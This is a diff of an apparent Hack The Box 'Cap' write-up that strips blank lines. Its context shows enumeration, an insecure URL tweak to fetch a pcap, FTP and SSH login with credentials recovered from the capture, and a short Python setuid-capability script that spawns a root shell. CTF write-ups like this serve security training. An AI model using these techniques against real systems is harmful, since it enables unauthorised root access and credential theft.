@@ -2,10 +2,6 @@
 
 <img src="../htb_assets/images/cap/2022-06-05-13-02-55-image.png" width="350px" height="350px"/>
 
-
-
-
-
 ## 1. Enumeration
 
 ### Nmap Initial Scan
@@ -125,10 +121,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 160.49 seconds
-
 ```
-
-
 
 #### Web Enumeration
 
@@ -136,13 +129,7 @@ Nmap done: 1 IP address (1 host up) scanned in 160.49 seconds
 
 We can download the .pcap file. After trying to change the number 2 to 0 in the url, we get the following results.
 
-
-
 <img src="../htb_assets/images/cap/2022-06-05-23-14-12-image.png"/>
-
-
-
-
 
 After analysing .pcap file in wireshark,  we can see a tcp stream using ftp. Folllowing the  tcp stream we get the user credentials.
 
@@ -151,8 +138,6 @@ After analysing .pcap file in wireshark,  we can see a tcp stream using ftp. Fol
 username: nathan
 
 Password: Buck3tH4TF0RM3!
-
-
 
 Now we can login to ftp,
 
@@ -184,8 +169,6 @@ ftp>
 
 Got the user flag.
 
-
-
 Let's try to login to ssh using same credentials.
 
 ```
@@ -200,10 +183,6 @@ nathan@cap:~$
 
 Login successful.
 
-
-
-
-
 ### 2. Privilege Escalation
 
 After running linpeas, we can find that python3.8 is running with setuid capabilities.
@@ -215,10 +194,7 @@ Files with capabilities (limited to 50):
 /usr/bin/traceroute6.iputils = cap_net_raw+ep
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
-
 ```
-
-
 
 So lets create a simple pyhton script to get root,
 
@@ -228,8 +204,6 @@ import os
 os.setuid(0)
 os.system('bash')
 ```
-
-
 
 ```
 nathan@cap:~$ python3 root.py 
@@ -242,10 +216,6 @@ root@cap:~# cd /root
 root@cap:/root# ls
 root.txt  snap
 root@cap:/root# cat root.txt 
-
-
 ```
 
 After running the script we gets the root shell and root flag.
-
-
